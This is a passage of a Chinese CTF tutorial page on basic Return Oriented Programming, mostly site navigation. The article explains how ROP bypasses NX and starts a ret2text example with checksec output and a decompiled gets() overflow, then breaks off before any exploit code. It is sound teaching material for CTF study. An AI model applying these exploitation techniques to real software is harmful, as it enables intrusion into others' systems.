



<!DOCTYPE html>
<html lang="zh" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      <meta http-equiv="x-ua-compatible" content="ie=edge">
      
      
      
      
        <meta name="lang:clipboard.copy" content="复制">
      
        <meta name="lang:clipboard.copied" content="已复制">
      
        <meta name="lang:search.language" content="jp">
      
        <meta name="lang:search.pipeline.stopwords" content="True">
      
        <meta name="lang:search.pipeline.trimmer" content="True">
      
        <meta name="lang:search.result.none" content="没有找到符合条件的结果">
      
        <meta name="lang:search.result.one" content="找到 1 个符合条件的结果">
      
        <meta name="lang:search.result.other" content="# 个符合条件的结果">
      
        <meta name="lang:search.tokenizer" content="[\uff0c\u3002]+">
      
      <link rel="shortcut icon" href="../../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-0.17.2, mkdocs-material-2.6.6">
    
    
      
        <title>基本 ROP - 二进制漏洞挖掘与利用</title>
      
    
    
      <link rel="stylesheet" href="../../../assets/stylesheets/application.78aab2dc.css">
      
        <link rel="stylesheet" href="../../../assets/stylesheets/application-palette.6079476c.css">
      
    
    
      <script src="../../../assets/javascripts/modernizr.1aa3b519.js"></script>
    
    
      <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
      
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Fira+Sans:300,400,400i,700|Fira+Mono">
        <style>body,input{font-family:"Fira Sans","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Fira Mono","Courier New",Courier,monospace}</style>
      
      <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
    
    
      <link rel="stylesheet" href="../../../_static/css/extra.css">
    
    
  </head>
  
    
    
    <body dir="ltr" data-md-color-primary="white" data-md-color-accent="red">
  
    <svg class="md-svg">
      <defs>
        
        
      </defs>
    </svg>
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="drawer">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="search">
    <label class="md-overlay" data-md-component="overlay" for="drawer"></label>
    
      <a href="#rop" tabindex="1" class="md-skip">
        跳转至
      </a>
    
    
      <header class="md-header" data-md-component="header">
  <nav class="md-header-nav md-grid">
    <div class="md-flex">
      <div class="md-flex__cell md-flex__cell--shrink">
        <a href="../../.." title="二进制漏洞挖掘与利用" class="md-header-nav__button md-logo">
          
            <i class="md-icon">school</i>
          
        </a>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        <label class="md-icon md-icon--menu md-header-nav__button" for="drawer"></label>
      </div>
      <div class="md-flex__cell md-flex__cell--stretch">
        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
          
            
              <span class="md-header-nav__topic">
                二进制漏洞挖掘与利用
              </span>
              <span class="md-header-nav__topic">
                基本 ROP
              </span>
            
          
        </div>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        
          
            <label class="md-icon md-icon--search md-header-nav__button" for="search"></label>
            
<div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
      <label class="md-icon md-search__icon" for="search"></label>
      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
        &#xE5CD;
      </button>
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="result">
          <div class="md-search-result__meta">
            键入以开始搜索
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
          
        
      </div>
      
    </div>
  </nav>
</header>
    
    <div class="md-container">
      
        
      
      
        

  

<nav class="md-tabs md-tabs--active" data-md-component="tabs">
  <div class="md-tabs__inner md-grid">
    <ul class="md-tabs__list">
      
        
  
  
    <li class="md-tabs__item">
      
        <a href="../../.." title="简介" class="md-tabs__link">
          简介
        </a>
      
    </li>
  

      
        
  
  
    <li class="md-tabs__item">
      
        <a href="../stack_intro/" title="栈溢出" class="md-tabs__link md-tabs__link--active">
          栈溢出
        </a>
      
    </li>
  

      
        
  
  
    <li class="md-tabs__item">
      
        <a href="../../fmtstr/fmtstr_intro/" title="格式化字符串漏洞" class="md-tabs__link">
          格式化字符串漏洞
        </a>
      
    </li>
  

      
        
  
  
    <li class="md-tabs__item">
      
        <a href="../../heap/introduction/" title="堆利用" class="md-tabs__link">
          堆利用
        </a>
      
    </li>
  

      
        
  
  
    <li class="md-tabs__item">
      
        <a href="../../io_file/introduction/" title="IO_FILE 利用" class="md-tabs__link">
          IO_FILE 利用
        </a>
      
    </li>
  

      
        
  
  
    <li class="md-tabs__item">
      
        <a href="../../race-condition/introduction/" title="条件竞争" class="md-tabs__link">
          条件竞争
        </a>
      
    </li>
  

      
        
  
  
    <li class="md-tabs__item">
      
        <a href="../../lab/6.1.1_pwn_hctf2016_brop/" title="练习" class="md-tabs__link">
          练习
        </a>
      
    </li>
  

      
    </ul>
  </div>
</nav>
      
      <main class="md-main">
        <div class="md-main__inner md-grid" data-md-component="container">
          
            
              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    <nav class="md-nav md-nav--primary" data-md-level="0">
  <label class="md-nav__title md-nav__title--site" for="drawer">
    <span class="md-nav__button md-logo">
      
        <i class="md-icon">school</i>
      
    </span>
    二进制漏洞挖掘与利用
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-1" type="checkbox" id="nav-1">
    
    <label class="md-nav__link" for="nav-1">
      简介
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-1">
        简介
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../.." title="简介" class="md-nav__link">
      简介
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      

  


  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2" checked>
    
    <label class="md-nav__link" for="nav-2">
      栈溢出
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-2">
        栈溢出
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../stack_intro/" title="栈介绍" class="md-nav__link">
      栈介绍
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../stackoverflow_basic/" title="栈溢出原理" class="md-nav__link">
      栈溢出原理
    </a>
  </li>

        
          
          
          

  


  <li class="md-nav__item md-nav__item--active">
    
    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="toc">
    
      
    
    
      <label class="md-nav__link md-nav__link--active" for="toc">
        基本 ROP
      </label>
    
    <a href="./" title="基本 ROP" class="md-nav__link md-nav__link--active">
      基本 ROP
    </a>
    
      
<nav class="md-nav md-nav--secondary">
  
  
    
  
  
    <label class="md-nav__title" for="toc">目录</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#ret2text" title="ret2text" class="md-nav__link">
    ret2text
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_1" title="原理" class="md-nav__link">
    原理
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_2" title="例子" class="md-nav__link">
    例子
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_3" title="题目" class="md-nav__link">
    题目
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#ret2shellcode" title="ret2shellcode" class="md-nav__link">
    ret2shellcode
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_4" title="原理" class="md-nav__link">
    原理
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_5" title="例子" class="md-nav__link">
    例子
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_6" title="题目" class="md-nav__link">
    题目
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#ret2syscall" title="ret2syscall" class="md-nav__link">
    ret2syscall
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_7" title="原理" class="md-nav__link">
    原理
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_8" title="例子" class="md-nav__link">
    例子
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_9" title="题目" class="md-nav__link">
    题目
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#ret2libc" title="ret2libc" class="md-nav__link">
    ret2libc
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_10" title="原理" class="md-nav__link">
    原理
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_11" title="例子" class="md-nav__link">
    例子
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#1" title="例1" class="md-nav__link">
    例1
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#2" title="例2" class="md-nav__link">
    例2
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#3" title="例3" class="md-nav__link">
    例3
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_12" title="题目" class="md-nav__link">
    题目
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#shell" title="shell获取小结" class="md-nav__link">
    shell获取小结
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_13" title="地址寻找小结" class="md-nav__link">
    地址寻找小结
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_14" title="通用寻找" class="md-nav__link">
    通用寻找
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_15" title="直接地址寻找" class="md-nav__link">
    直接地址寻找
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#got" title="got表寻找" class="md-nav__link">
    got表寻找
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#libc" title="有libc" class="md-nav__link">
    有libc
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#libc_1" title="无libc" class="md-nav__link">
    无libc
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#dynelf" title="DynELF" class="md-nav__link">
    DynELF
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#libc_2" title="libc数据库" class="md-nav__link">
    libc数据库
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ret2dl-resolve" title="ret2dl-resolve" class="md-nav__link">
    ret2dl-resolve
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_16" title="题目" class="md-nav__link">
    题目
  </a>
  
</li>
      
      
      
      
      
    </ul>
  
</nav>
    
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../others/" title="花式栈溢出技巧" class="md-nav__link">
      花式栈溢出技巧
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../medium_rop/" title="中级 ROP" class="md-nav__link">
      中级 ROP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../advanced_rop/" title="高级 ROP" class="md-nav__link">
      高级 ROP
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3">
    
    <label class="md-nav__link" for="nav-3">
      格式化字符串漏洞
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-3">
        格式化字符串漏洞
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../fmtstr/fmtstr_intro/" title="格式化字符串漏洞原理介绍" class="md-nav__link">
      格式化字符串漏洞原理介绍
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../fmtstr/fmtstr_exploit/" title="格式化字符串漏洞利用" class="md-nav__link">
      格式化字符串漏洞利用
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../fmtstr/fmtstr_example/" title="格式化字符串漏洞例子" class="md-nav__link">
      格式化字符串漏洞例子
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../fmtstr/fmtstr_detect/" title="格式化字符串漏洞检测" class="md-nav__link">
      格式化字符串漏洞检测
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-5" type="checkbox" id="nav-3-5">
    
    <label class="md-nav__link" for="nav-3-5">
      实验
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-3-5">
        实验
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../fmtstr/example/picoctf-2014-guess/Write-up_cn/" title="picoctf-2014 guess" class="md-nav__link">
      picoctf-2014 guess
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4" type="checkbox" id="nav-4">
    
    <label class="md-nav__link" for="nav-4">
      堆利用
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-4">
        堆利用
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../heap/introduction/" title="堆利用简介" class="md-nav__link">
      堆利用简介
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../heap/heap_overview/" title="堆概述" class="md-nav__link">
      堆概述
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../heap/heap_structure/" title="堆相关数据结构" class="md-nav__link">
      堆相关数据结构
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../heap/heap_implementation_details/" title="深入理解堆的实现" class="md-nav__link">
      深入理解堆的实现
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../heap/heapoverflow_basic/" title="堆溢出" class="md-nav__link">
      堆溢出
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../heap/off_by_one/" title="堆中的 Off-By-One" class="md-nav__link">
      堆中的 Off-By-One
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../heap/unlink/" title="Unlink" class="md-nav__link">
      Unlink
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../heap/use_after_free/" title="Use After Free" class="md-nav__link">
      Use After Free
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../heap/fastbin_attack/" title="Fastbin Attack" class="md-nav__link">
      Fastbin Attack
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../heap/chunk_extend_shrink/" title="Chunk Extend / Shrink" class="md-nav__link">
      Chunk Extend / Shrink
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../heap/house_of_einherjar/" title="House Of Einherjar" class="md-nav__link">
      House Of Einherjar
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../heap/house_of_lore/" title="House of Lore" class="md-nav__link">
      House of Lore
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../heap/house_of_force/" title="House Of Force" class="md-nav__link">
      House Of Force
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../heap/unsorted_bin_attack/" title="Unsorted Bin Attack" class="md-nav__link">
      Unsorted Bin Attack
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../heap/house_of_orange/" title="House of Orange" class="md-nav__link">
      House of Orange
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-5" type="checkbox" id="nav-5">
    
    <label class="md-nav__link" for="nav-5">
      IO_FILE 利用
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-5">
        IO_FILE 利用
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../io_file/introduction/" title="FILE 文件结构介绍" class="md-nav__link">
      FILE 文件结构介绍
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../io_file/fake-vtable-exploit/" title="伪造 vtable 劫持程序流程" class="md-nav__link">
      伪造 vtable 劫持程序流程
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../io_file/fsop/" title="FSOP" class="md-nav__link">
      FSOP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../io_file/exploit-in-libc2.24/" title="新版本 libc 下 IO_FILE 的利用" class="md-nav__link">
      新版本 libc 下 IO_FILE 的利用
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-6" type="checkbox" id="nav-6">
    
    <label class="md-nav__link" for="nav-6">
      条件竞争
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-6">
        条件竞争
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../race-condition/introduction/" title="条件竞争介绍" class="md-nav__link">
      条件竞争介绍
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../race-condition/problem/" title="例题" class="md-nav__link">
      例题
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-7" type="checkbox" id="nav-7">
    
    <label class="md-nav__link" for="nav-7">
      练习
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-7">
        练习
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../lab/6.1.1_pwn_hctf2016_brop/" title="HCTF2016 brop" class="md-nav__link">
      HCTF2016 brop
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../lab/6.1.2_pwn_njctf2017_pingme/" title="NJCTF2017 pingme" class="md-nav__link">
      NJCTF2017 pingme
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../lab/6.1.3_pwn_xdctf2015_pwn200/" title="XDCTF2015 pwn200" class="md-nav__link">
      XDCTF2015 pwn200
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../lab/6.1.4_pwn_backdoorctf2017_fun_signals/" title="BackdoorCTF2017 Fun-Signals" class="md-nav__link">
      BackdoorCTF2017 Fun-Signals
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../lab/6.1.5_pwn_grehackctf2017_beerfighter/" title="GreHackCTF2017 beerfighter" class="md-nav__link">
      GreHackCTF2017 beerfighter
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../lab/6.1.6_pwn_defconctf2015_fuckup/" title="DefconCTF2015 fuckup" class="md-nav__link">
      DefconCTF2015 fuckup
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../lab/6.1.7_pwn_0ctf2015_freenote/" title="0CTF2015 freenote" class="md-nav__link">
      0CTF2015 freenote
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../lab/6.1.8_pwn_dctf2017_flex/" title="DCTF2017 Flex" class="md-nav__link">
      DCTF2017 Flex
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../lab/6.1.9_rhme3_exploitation/" title="RHme3 Exploitation" class="md-nav__link">
      RHme3 Exploitation
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../lab/6.1.10_0ctf2017_babyheap2017/" title="0CTF2017 BabyHeap2017" class="md-nav__link">
      0CTF2017 BabyHeap2017
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../lab/6.1.11_9447ctf2015_search_engine/" title="9447CTF2015 Search-Engine" class="md-nav__link">
      9447CTF2015 Search-Engine
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    
<nav class="md-nav md-nav--secondary">
  
  
    
  
  
    <label class="md-nav__title" for="toc">目录</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#ret2text" title="ret2text" class="md-nav__link">
    ret2text
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_1" title="原理" class="md-nav__link">
    原理
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_2" title="例子" class="md-nav__link">
    例子
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_3" title="题目" class="md-nav__link">
    题目
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#ret2shellcode" title="ret2shellcode" class="md-nav__link">
    ret2shellcode
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_4" title="原理" class="md-nav__link">
    原理
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_5" title="例子" class="md-nav__link">
    例子
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_6" title="题目" class="md-nav__link">
    题目
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#ret2syscall" title="ret2syscall" class="md-nav__link">
    ret2syscall
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_7" title="原理" class="md-nav__link">
    原理
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_8" title="例子" class="md-nav__link">
    例子
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_9" title="题目" class="md-nav__link">
    题目
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#ret2libc" title="ret2libc" class="md-nav__link">
    ret2libc
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_10" title="原理" class="md-nav__link">
    原理
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_11" title="例子" class="md-nav__link">
    例子
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#1" title="例1" class="md-nav__link">
    例1
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#2" title="例2" class="md-nav__link">
    例2
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#3" title="例3" class="md-nav__link">
    例3
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_12" title="题目" class="md-nav__link">
    题目
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#shell" title="shell获取小结" class="md-nav__link">
    shell获取小结
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_13" title="地址寻找小结" class="md-nav__link">
    地址寻找小结
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_14" title="通用寻找" class="md-nav__link">
    通用寻找
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_15" title="直接地址寻找" class="md-nav__link">
    直接地址寻找
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#got" title="got表寻找" class="md-nav__link">
    got表寻找
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#libc" title="有libc" class="md-nav__link">
    有libc
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#libc_1" title="无libc" class="md-nav__link">
    无libc
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#dynelf" title="DynELF" class="md-nav__link">
    DynELF
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#libc_2" title="libc数据库" class="md-nav__link">
    libc数据库
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ret2dl-resolve" title="ret2dl-resolve" class="md-nav__link">
    ret2dl-resolve
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_16" title="题目" class="md-nav__link">
    题目
  </a>
  
</li>
      
      
      
      
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          <div class="md-content">
            <article class="md-content__inner md-typeset">
              
                
                
                <h1 id="rop">基本ROP<a class="headerlink" href="#rop" title="Permanent link">&para;</a></h1>
<p>随着NX保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是ROP(Return Oriented Programming)，其主要思想是在<strong>栈缓冲区溢出的基础上(这一条之后不再重复提及)，通过利用程序中已有的小片段(gadgets)来改变某些寄存器或者变量的值，从而改变程序的执行流程。</strong>所谓gadgets就是以ret结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p>
<p>之所以称之为ROP，是因为核心在于利用了指令集中的ret指令，改变了指令流的执行顺序。ROP攻击一般得满足如下条件</p>
<ul>
<li>程序存在溢出，并且可以控制返回地址。</li>
<li>可以找到满足条件的gadgets以及相应gadgets的地址。如果当程序开启了PIE保护，那么就必须想办法泄露gadgets的地址了。</li>
</ul>
<h2 id="ret2text">ret2text<a class="headerlink" href="#ret2text" title="Permanent link">&para;</a></h2>
<h3 id="_1">原理<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h3>
<p>ret2text即需要我们控制程序执行程序本身已有的的代码(.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码(也就是gadgets)，这就是我们所要说的rop。</p>
<p>这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。</p>
<h3 id="_2">例子<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h3>
<p>其实，在栈溢出的基本原理中，我们已经介绍了这一简单的攻击。在这里，我们再给出另外一个例子，bamboofox中介绍ROP时使用的ret2text的例子。</p>
<p>点击下载: <a href="https://github.com/ctf-wiki/ctf-wiki/raw/master/pwn/stackoverflow/example/ret2text/ret2text">ret2text</a></p>
<p>首先，查看一下程序的保护机制</p>
<div class="codehilite"><pre><span></span>➜  ret2text checksec ret2text
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class="o">(</span>0x8048000<span class="o">)</span>
</pre></div>

<p>可以看出程序是32位程序，其仅仅开启了栈不可执行保护。然后，我们使用IDA来查看源代码。</p>
<div class="codehilite"><pre><span></span><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [sp+1Ch] [bp-64h]@1</span>

  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="n">setvbuf</span><span class="p">(</span><span class="n">_bss_start</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;There is something amazing here, do you know anything?&quot;</span><span class="p">);</span>
  <span class="n">gets</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v4</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Maybe I will tell you next time !&quot;</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>

<p>可以看出程序在主函数中使用了gets函数，显然存在栈溢出漏洞。此后又发现</p>
<div class="codehilite"><pre><span></span><span class="nl">.text:</span><span class="err">080485</span><span class="nf">FD</span> <span class="no">secure</span>          <span class="no">proc</span> <span class="no">near</span>
